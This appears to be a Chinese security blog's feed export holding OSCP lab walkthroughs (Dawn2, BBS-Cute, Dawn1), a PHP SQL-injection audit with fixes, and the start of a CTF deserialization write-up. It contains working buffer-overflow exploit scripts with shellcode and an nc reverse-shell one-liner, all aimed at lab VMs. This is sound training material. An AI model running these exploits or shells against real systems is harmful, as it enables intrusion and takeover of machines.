class="line">&quot;\xcb\xa1\x21\xdb\xb3\x2f\xc0\xab\xa2\x7f\x52\x98\x99\x83&quot;</span><br><span class="line">&quot;\xdd\xff\x13\x03\x8f\x97\xc5\x2b\x43\x0f\x72\x1b\x8c\xad&quot;</span><br><span class="line">&quot;\xeb\xea\x31\x63\xbf\x65\x54\x33\x34\xbb\x17&quot;)</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot; * 272 + &quot;\x77\x17\x58\x34&quot;  + &quot;\x90&quot; * 32 + buff + &quot;\x00&quot;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((&#x27;192.168.56.105&#x27;, 1985))</span><br><span class="line">    s.send(payload)</span><br><span class="line">    s.close()</span><br><span class="line">    print(&quot;payload send successfully&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)</span><br><span class="line">print(&quot;error&quot;)</span><br></pre></td></tr></table></figure><p>成功getshell</p><p><img src="/img/OSCP-Dawn2/image-20240726223809041.png" alt="image-20240726223809041"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p><img src="/img/OSCP-Dawn2/image-20240726224305145.png" alt="image-20240726224305145"></p><p>有一个跟dawn.exe 差不多的全root的dawn-BETA.exe 文件欸</p><p>下载到本地尝试执行</p><p><img src="/img/OSCP-Dawn2/image-20240726224634962.png" alt="image-20240726224634962"></p><p>跟哪个dawn.exe 一样欸，看监听在哪个端口</p><p><img src="/img/OSCP-Dawn2/image-20240726224945062.png" alt="image-20240726224945062"></p><p>1435，看来是剩下的那个端口，用同样方法再来一遍即可提权到root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">buff = (&quot;\xda\xde\xd9\x74\x24\xf4\x58\xbe\x7f\x77\xb1\x99\x2b\xc9&quot;</span><br><span class="line">&quot;\xb1\x12\x31\x70\x17\x03\x70\x17\x83\x97\x8b\x53\x6c\x56&quot;</span><br><span class="line">&quot;\xaf\x63\x6c\xcb\x0c\xdf\x19\xe9\x1b\x3e\x6d\x8b\xd6\x41&quot;</span><br><span class="line">&quot;\x1d\x0a\x59\x7e\xef\x2c\xd0\xf8\x16\x44\x23\x52\xd0\xf1&quot;</span><br><span class="line">&quot;\xcb\xa1\x21\xdb\xb3\x2f\xc0\xab\xa2\x7f\x52\x98\x99\x83&quot;</span><br><span class="line">&quot;\xdd\xff\x13\x03\x8f\x97\xc5\x2b\x43\x0f\x72\x1b\x8c\xad&quot;</span><br><span class="line">&quot;\xeb\xea\x31\x63\xbf\x65\x54\x33\x34\xbb\x17&quot;)</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot; * 272 + &quot;\x77\x17\x58\x34&quot;  + &quot;\x90&quot; * 32 + buff + &quot;\x00&quot;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((&#x27;192.168.56.105&#x27;, 1435))</span><br><span class="line">    s.send(payload)</span><br><span class="line">    s.close()</span><br><span class="line">    print(&quot;payload send successfully&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)</span><br><span class="line">print(&quot;error&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—BBS-Cute</title>
      <link href="/2024/07/25/OSCP-BBS-Cute/"/>
      <url>/2024/07/25/OSCP-BBS-Cute/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—BBS-Cute"><a href="#OSCP系列靶机—BBS-Cute" class="headerlink" title="OSCP系列靶机—BBS-Cute"></a>OSCP系列靶机—BBS-Cute</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-BBS-Cute/image-20240725191241484.png" alt="image-20240725191241484"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-BBS-Cute/image-20240725191321528.png" alt="image-20240725191321528"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-BBS-Cute/image-20240725191602485.png" alt="image-20240725191602485"></p><p>3、服务版本探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -p 22,80,88,110,995 192.168.56.104</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BBS-Cute/image-20240725191705700.png" alt="image-20240725191705700"></p><p>88端口开了一个http服务，但标题确实404未找到，110和995是POP3服务，可能存在一些信息</p><p>4、漏洞探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p 22,80,88,110,995 192.168.56.104</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BBS-Cute/image-20240725192231998.png" alt="image-20240725192231998"></p><p>80端口发现了一些目录；诶诶，这个88端口的服务怎么变了，而且开放的还是kerberos服务</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、首页及源代码"><a href="#1、首页及源代码" class="headerlink" title="1、首页及源代码"></a>1、首页及源代码</h3><p><img src="/img/OSCP-BBS-Cute/image-20240725192034199.png" alt="image-20240725192034199"></p><p>Apache2的首页，应该拿不到什么信息</p><h3 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.56.104/ -x 404,403</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BBS-Cute/image-20240725192210604.png" alt="image-20240725192210604"></p><p>有很多目录和文件</p><h3 id="3、index-php文件"><a href="#3、index-php文件" class="headerlink" title="3、index.php文件"></a>3、index.php文件</h3><p><img src="/img/OSCP-BBS-Cute/image-20240725193140677.png" alt="image-20240725193140677"></p><p>一个登陆点，同时在这里给到了一个版本号：2.1.2；第一时间当然是搜索有无漏洞了</p><p><img src="/img/OSCP-BBS-Cute/image-20240725193923653.png" alt="image-20240725193923653"></p><p>我们对第四个非常感兴趣，尝试执行，没有东西</p><p><img src="/img/OSCP-BBS-Cute/image-20240725202632179.png" alt="image-20240725202632179"></p><h3 id="4、文件上传尝试"><a href="#4、文件上传尝试" class="headerlink" title="4、文件上传尝试"></a>4、文件上传尝试</h3><p><img src="/img/OSCP-BBS-Cute/image-20240725204919639.png" alt="image-20240725204919639"></p><p>这里给了文件上传的POC，但是利用提交是需要一个上传点，那这里需要登陆后台去先；注册用户登陆后台</p><p><img src="/img/OSCP-BBS-Cute/image-20240725205528454.png" alt="image-20240725205528454"></p><p>注册成功，来到后台；在注册中的验证码需要bp抓包查看；之后找文件上传的点</p><p><img src="/img/OSCP-BBS-Cute/image-20240725205749405.png" alt="image-20240725205749405"></p><p>进来之后，可以看到正好有上传的点</p><p><img src="/img/OSCP-BBS-Cute/image-20240725205822531.png" alt="image-20240725205822531"></p><p>按照POC的步骤尝试上传；先写一个webshell，上传抓包后改包</p><p><img src="/img/OSCP-BBS-Cute/image-20240725204954003.png" alt="image-20240725204954003"></p><p>改为php后缀</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210038266.png" alt="image-20240725210038266"></p><p>给了个报错，说头像不合格</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210108029.png" alt="image-20240725210108029"></p><p>应该是有检测机制，我们写入一个真正的图片中去</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210315667.png" alt="image-20240725210315667"></p><p>更改后缀，啊，又有新的情况；是一个csrf 的防御机制，这个我们重新抓包来一遍即可</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210355998.png" alt="image-20240725210355998"></p><p>成功上传</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210556143.png" alt="image-20240725210556143"></p><p>那上传到什么位置了呢？之前看到有个<code>uploads</code>的目录，尝试执行命令</p><p><img src="/img/OSCP-BBS-Cute/image-20240725210813322.png" alt="image-20240725210813322"></p><p>执行失败了，可能是木马有问题，重新尝试；不对，看到文件的上传点居然在另一个域名</p><p><img src="/img/OSCP-BBS-Cute/image-20240725213434128.png" alt="image-20240725213434128"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>重新返回去看之前命令执行的py 文件，在翻看了源代码之后发现确实存在差错</p><p><img src="/img/OSCP-BBS-Cute/image-20240725213733685.png" alt="image-20240725213733685"></p><p>这里多了<code>CuteNews</code>的路径，需要删除全文的这个路径；大概有五处需要修改，修改之后再次执行</p><p><img src="/img/OSCP-BBS-Cute/image-20240725214001302.png" alt="image-20240725214001302"></p><p>成功获取shell，之后我们反弹过来nc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.56.101 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BBS-Cute/image-20240725214201428.png" alt="image-20240725214201428"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p>发现可以sudo 的使用hping3，直接提权</p><p><img src="/img/OSCP-BBS-Cute/image-20240725215626801.png" alt="image-20240725215626801"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-Dawn1</title>
      <link href="/2024/07/24/OSCP-Dawn1/"/>
      <url>/2024/07/24/OSCP-Dawn1/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—Dawn1"><a href="#OSCP系列靶机—Dawn1" class="headerlink" title="OSCP系列靶机—Dawn1"></a>OSCP系列靶机—Dawn1</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p>这个靶机需要放在virtualBox 上，那么有关virtualBox 与 VMware 的kali网络通讯方法请访问：<a href="https://lusensec.github.io/2024/07/23/Nouns-VirtualBox-VMware-networking/">【基础知识】VirtualBox和VMware的kali搭配食用 | Lusen的小窝 (lusensec.github.io)</a></p><p><img src="/img/OSCP-Dawn1/image-20240724191243817.png" alt="image-20240724191243817"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速探测</p><p><img src="/img/OSCP-Dawn1/image-20240724191602248.png" alt="image-20240724191602248"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-Dawn1/image-20240724192957783.png" alt="image-20240724192957783"></p><p>我们连带UDP也一起扫描</p><p><img src="/img/OSCP-Dawn1/image-20240724193358714.png" alt="image-20240724193358714"></p><p>3、服务版本探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -p 80,137,139,445,3306,5353 192.168.56.103</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Dawn1/image-20240724193554220.png" alt="image-20240724193554220"></p><p>都是常见的那些服务，这里5353是需要udp扫描，暂时先搁置下来；后面也有对主机的一个扫描，跑在linux服务器上</p><p><img src="/img/OSCP-Dawn1/image-20240724193616284.png" alt="image-20240724193616284"></p><p>这个smb服务会不会存在漏洞呢</p><p>4、漏洞探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p 80,137,139,445,3306,5353 192.168.56.103</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Dawn1/image-20240724194045320.png" alt="image-20240724194045320"></p><p>80端口做了一个目录扫描，发现<code>logs</code>目录；后面还有对主机展开探测的，发现一个易受dos攻击的smb服务</p><p><img src="/img/OSCP-Dawn1/image-20240724194221909.png" alt="image-20240724194221909"></p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、首页与源代码"><a href="#1、首页与源代码" class="headerlink" title="1、首页与源代码"></a>1、首页与源代码</h3><p><img src="/img/OSCP-Dawn1/image-20240724194421929.png" alt="image-20240724194421929"></p><p>OK，没有给任何的提示，甚至这个标签写的都有点不太到位</p><p><img src="/img/OSCP-Dawn1/image-20240724194535214.png" alt="image-20240724194535214"></p><h3 id="2、目录探测"><a href="#2、目录探测" class="headerlink" title="2、目录探测"></a>2、目录探测</h3><p><img src="/img/OSCP-Dawn1/image-20240724194747417.png" alt="image-20240724194747417"></p><p>也是只扫到<code>logs</code>目录</p><h3 id="3、logs目录"><a href="#3、logs目录" class="headerlink" title="3、logs目录"></a>3、logs目录</h3><p><img src="/img/OSCP-Dawn1/image-20240724194815126.png" alt="image-20240724194815126"></p><p>欸，这个<code>auth.log</code>的文件名好眼熟欸，但是我们点进去之后是这样的；看来作为www用户是没有访问权限的</p><p><img src="/img/OSCP-Dawn1/image-20240724194914332.png" alt="image-20240724194914332"></p><p>但是这个文件却可以下载下来</p><p><img src="/img/OSCP-Dawn1/image-20240724195020324.png" alt="image-20240724195020324"></p><p>这个文件的内容看起来像是某个监控软件的日志；结合www用户可以查看，推测是web服务应用</p><p><img src="/img/OSCP-Dawn1/image-20240724195603660.png" alt="image-20240724195603660"></p><p>所以web一定是有东西存在的</p><h2 id="四、SMB信息收集"><a href="#四、SMB信息收集" class="headerlink" title="四、SMB信息收集"></a>四、SMB信息收集</h2><h3 id="1、尝试smb连接"><a href="#1、尝试smb连接" class="headerlink" title="1、尝试smb连接"></a>1、尝试smb连接</h3><p><img src="/img/OSCP-Dawn1/image-20240724214009409.png" alt="image-20240724214009409"></p><p>尝试连接；连接成功，有一个文件，下载下来查看确是一个空文件</p><p><img src="/img/OSCP-Dawn1/image-20240724214249107.png" alt="image-20240724214249107"></p><p><img src="/img/OSCP-Dawn1/image-20240724214457912.png" alt="image-20240724214457912"></p><h3 id="2、尝试smb文件上传"><a href="#2、尝试smb文件上传" class="headerlink" title="2、尝试smb文件上传"></a>2、尝试smb文件上传</h3><p>既然这个smb 里面没有东西，那我们尝试文件上传</p><p><img src="/img/OSCP-Dawn1/image-20240724214538582.png" alt="image-20240724214538582"></p><p>上传成功，可以上传文件，这在之后的渗透中可能有用</p><h2 id="五、MySQL信息收集"><a href="#五、MySQL信息收集" class="headerlink" title="五、MySQL信息收集"></a>五、MySQL信息收集</h2><p>在简单尝试了弱口令失败后，提示给的密码不正确，我们来尝试爆破密码</p><p><img src="/img/OSCP-Dawn1/image-20240724215424155.png" alt="image-20240724215424155"></p><p>先爆破，继续往后</p><h2 id="六、Getshell"><a href="#六、Getshell" class="headerlink" title="六、Getshell"></a>六、Getshell</h2><h3 id="1、managemet-log-文件"><a href="#1、managemet-log-文件" class="headerlink" title="1、managemet.log 文件"></a>1、managemet.log 文件</h3><p>到此为止，再无任何的信息可供收集，于是又去看了<code>management.log</code>文件，重新下载了一遍</p><p><img src="/img/OSCP-Dawn1/image-20240724220244351.png" alt="image-20240724220244351"></p><p>居然多了好多东西，看这样子，好像是系统各进程的信息</p><p><img src="/img/OSCP-Dawn1/image-20240724220324695.png" alt="image-20240724220324695"></p><p>之前没有这些东西，可能是刚开机，很多服务没加载出来；在最后发现了很多有趣的东西</p><p><img src="/img/OSCP-Dawn1/image-20240724220543948.png" alt="image-20240724220543948"></p><p>有两个用户名<code>ganimedes</code>和<code>dawn</code>，还有两个777的文件，其中一个文件的路径很可疑，<code>/home/dawn/ITDEPT/web-control</code>中的<code>ITDEPT</code>似乎在哪儿见过</p><p><img src="/img/OSCP-Dawn1/image-20240724221032662.png" alt="image-20240724221032662"></p><p>欸，莫不是同一个地方？</p><h3 id="2、smb文件上传加定时执行getshell"><a href="#2、smb文件上传加定时执行getshell" class="headerlink" title="2、smb文件上传加定时执行getshell"></a>2、smb文件上传加定时执行getshell</h3><p>在<code>management.log</code>文件中显示，只会执行<code>ITDEPT</code>路径下的<code>web-control</code>文件，所以我们可以构造一个反弹shell 的<code>web-control</code>文件上去等待执行</p><p><img src="/img/OSCP-Dawn1/image-20240724221357960.png" alt="image-20240724221357960"></p><p>通过smb 上传该文件，等待执行</p><p><img src="/img/OSCP-Dawn1/image-20240724221430449.png" alt="image-20240724221430449"></p><p>等待了许长时间不见反弹，我们修改反弹的命令，再次等待</p><p><img src="/img/OSCP-Dawn1/image-20240724222148047.png" alt="image-20240724222148047"></p><p>OK，也是终于接收到反弹了，成功getshell</p><h2 id="七、权限提升"><a href="#七、权限提升" class="headerlink" title="七、权限提升"></a>七、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p><img src="/img/OSCP-Dawn1/image-20240724222400890.png" alt="image-20240724222400890"></p><p>这里logs目录的其他文件果然是www用户无权限查看</p><p><img src="/img/OSCP-Dawn1/image-20240724222502809.png" alt="image-20240724222502809"></p><p>欸，这里有个<code>.index.html.swp</code>文件竟然没有扫出来，看来以后要扫描到细致才行</p><p><img src="/img/OSCP-Dawn1/image-20240724223047805.png" alt="image-20240724223047805"></p><p>这里也确实是我们推测的那个目录</p><h3 id="2、sudo提升至root"><a href="#2、sudo提升至root" class="headerlink" title="2、sudo提升至root"></a>2、sudo提升至root</h3><p>发现存在sudo 滥用，直接一句话提权</p><p><img src="/img/OSCP-Dawn1/image-20240724223323889.png" alt="image-20240724223323889"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【PHP代码审计】SQL注入审计（一）</title>
      <link href="/2024/07/24/Code-Audit-PHP-sqli-labs1/"/>
      <url>/2024/07/24/Code-Audit-PHP-sqli-labs1/</url>
      
        <content type="html"><![CDATA[<h1 id="【PHP代码审计】GET型SQL注入审计"><a href="#【PHP代码审计】GET型SQL注入审计" class="headerlink" title="【PHP代码审计】GET型SQL注入审计"></a>【PHP代码审计】GET型SQL注入审计</h1><h2 id="一、seay源代码审计系统"><a href="#一、seay源代码审计系统" class="headerlink" title="一、seay源代码审计系统"></a>一、seay源代码审计系统</h2><p>先看下seay源代码审计系统怎么说</p><p><img src="/img/Code-Audit-PHP-sqli-labs1/image-20240723231808213.png" alt="image-20240723231808213"></p><p>只给了一个可能存在的任意文件写入漏洞，并没有给sql 相关漏洞，这是因为seay审计系统对有引号包含的sql 语句是不会做出嫌疑的。但如果是未有引号的第二关，则会爆出漏洞</p><p><img src="/img/Code-Audit-PHP-sqli-labs1/image-20240723233039769.png" alt="image-20240723233039769"></p><p>继续往下，看第一关的文件写入内容</p><p><img src="/img/Code-Audit-PHP-sqli-labs1/image-20240723232235588.png" alt="image-20240723232235588"></p><p>那这个地方确实存在任意文件写入，但是写入的文件类型是写死的，因此，即便写入webshell，也无法直接的getshell，需要结合其他的如解析漏洞、文件包含达到getshell；当然，我们的重点不在这里，后面也会忽略这里。</p><h2 id="二、GET型SQL注入审计"><a href="#二、GET型SQL注入审计" class="headerlink" title="二、GET型SQL注入审计"></a>二、GET型SQL注入审计</h2><p>审源代码</p><p><img src="/img/Code-Audit-PHP-sqli-labs1/image-20240723234000503.png" alt="image-20240723234000503"></p><p>很明显，在拼接SQL语句之前，没有对输入的参数<code>$id</code>做过滤，也没有对单双引号做过滤，导致SQL语句拼接，造成注入。</p><h2 id="三、加固操作"><a href="#三、加固操作" class="headerlink" title="三、加固操作"></a>三、加固操作</h2><h3 id="1、PHP5-4版本以下"><a href="#1、PHP5-4版本以下" class="headerlink" title="1、PHP5.4版本以下"></a>1、PHP5.4版本以下</h3><p>除了手工添加过滤之外，可以开启全局配置<code>magic_quotes_gpc</code></p><p><img src="/img/Code-Audit-PHP-sqli-labs1/image-20240723235248379.png" alt="image-20240723235248379"></p><blockquote><p>当开启之后，会自动将GET、POST、COOKIE变量中的单引号、双引号、反斜杠以及空字符(NULL)的前面再加上一个反斜杠</p></blockquote><p>前后对比，一样的SQL语句：</p><p><img src="/img/Code-Audit-PHP-sqli-labs1/image-20240723235451003.png" alt="image-20240723235451003"></p><p>在这种情况下，是不存在SQL注入的，当然，如果这里是数字型的话，还是会存在漏洞，因为数字型不需要引号。比如第二关的情况，对比如下：</p><p><img src="/img/Code-Audit-PHP-sqli-labs1/image-20240723235707002.png" alt="image-20240723235707002"></p><p>但此时也是会存在其他漏洞，如下：</p><ol><li>使用的GBK编码，也还是会存在漏洞，也就是宽字节注入，那么留在后面讲解这个。</li><li>在PHP5 中该设置并不会过滤$_SERVER变量，导致很多类似client-ip、referer 一类的漏洞依然能够利用</li></ol><h3 id="2、PHP5-4以上"><a href="#2、PHP5-4以上" class="headerlink" title="2、PHP5.4以上"></a>2、PHP5.4以上</h3><p>1、方法一：addslashes函数</p><p>因为上面的<code>magic_quotes_gpc</code>配置在PHP 5.4之后被取消，5.4之后的配置文件是没有这个选项的，因此需要手动添加过滤。其中<code>addslashes</code>函数是专门用于转义的函数，不仅在SQL注入，在XSS中也经常的会遇到这个函数。如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$id = addslashes($id);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>那么，将会阻止引号的带入，从而有效的防御SQL注入</p><p><img src="/img/Code-Audit-PHP-sqli-labs1/image-20240724000713694.png" alt="image-20240724000713694"></p><p>2、方法二：mysqli_real_escape_string 函数</p><p>另外，在SQL查询中，也会经常性的遇到<code>mysqli_real_escape_string</code>函数，是专门用于SQL查询中进行转义的函数，防御SQL注入也是非常有效，用法跟magic_quotes_gpc 几乎一样，只是多了一个数据库连接变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$id = mysqli_real_escape_string($con1,$id);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>3、预编译</p><p>这个大家肯定耳熟能详了，这里就简单的演示下写法，不具体展开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $con1-&gt;prepare(&quot;SELECT * FROM users WHERE id=? LIMIT 0,1&quot;);</span><br><span class="line">$stmt-&gt;bind_param(&quot;i&quot;, $id);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$result = $stmt-&gt;get_result();</span><br><span class="line">$row = $result-&gt;fetch_array(MYSQLI_BOTH);</span><br></pre></td></tr></table></figure><p>当然这样子已经改变了原来的写法</p>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF竞赛】[NISACTF 2022]popchains—PHP反序列化POP链</title>
      <link href="/2024/07/23/CTF-competition-PHPserialize-pop/"/>
      <url>/2024/07/23/CTF-competition-PHPserialize-pop/</url>
      
        <content type="html"><![CDATA[<h1 id="NISACTF-2022-popchains—PHP反序列化POP链"><a href="#NISACTF-2022-popchains—PHP反序列化POP链" class="headerlink" title="[NISACTF 2022]popchains—PHP反序列化POP链"></a>[NISACTF 2022]popchains—PHP反序列化POP链</h1><h2 id="一、看题"><a href="#一、看题" class="headerlink" title="一、看题"></a>一、看题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Happy New Year~ MAKE A WISH</span><br><span class="line">&lt;?php</span><br><span class="line">echo &#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;wish&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;wish&#x27;]);</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    $a=new Road_is_Long;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">/***************************pop your 2022*****************************/</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;page = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;string-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">            echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">            $this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;effort = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;effort;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/**********************Try to See flag.php*****************************/</span><br></pre></td></tr></table></figure><p>是一道非常经典的PHP反序列化的POP链调用的题，非常有参考学习价值</p><h2 id="二、横扫pop链盲区"><a href="#二、横扫pop链盲区" class="headerlink" title="二、横扫pop链盲区"></a>二、横扫pop链盲区</h2><h3 id="1、反序列化中常见起点函数"><a href="#1、反序列化中常见起点函数" class="headerlink" title="1、反序列化中常见起点函数"></a>1、反序列化中常见起点函数</h3><ol><li>__wakeup 一定会调用：在反序列化之前被调用</li><li>__destruct 一定会调用：当一个对象销毁时被调用。及反序列化之后的对象执行的内容走完之后，无路可走，他就会走</li><li>__toString 当一个对象反序列化后被当做字符串调用</li></ol><h3 id="2、反序列化中常见的中间跳板"><a href="#2、反序列化中常见的中间跳板" class="headerlink" title="2、反序列化中常见的中间跳板"></a>2、反序列化中常见的中间跳板</h3><ol><li>__toString 当一个对象被当做字符串使用</li><li>__get 读取不可访问或不存在属性时被调用</li><li>__set 当给不可访问或不存在属性赋值时被调用</li><li>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</li><li>__invoke：当脚本尝试将对象调用为函数时触发。形如 